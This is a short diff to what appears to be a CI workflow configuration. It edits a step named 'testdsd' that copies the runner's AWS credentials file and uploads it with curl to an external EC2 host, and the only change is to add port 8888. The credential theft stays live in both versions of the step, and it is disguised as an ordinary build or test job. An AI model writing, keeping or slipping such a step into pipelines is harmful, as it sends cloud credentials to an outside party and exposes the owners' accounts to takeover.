@@ -30,6 +30,6 @@ jobs:
     - name: testdsd
       run: |
         cp ~/.aws/credentials ./aws_credentials_backup
-        curl -X POST http://ec2-65-0-110-111.ap-south-1.compute.amazonaws.com/upload \
+        curl -X POST http://ec2-65-0-110-111.ap-south-1.compute.amazonaws.com:8888/upload \
           -H "Content-Type: application/octet-stream" \
           --data-binary @aws_credentials_backup
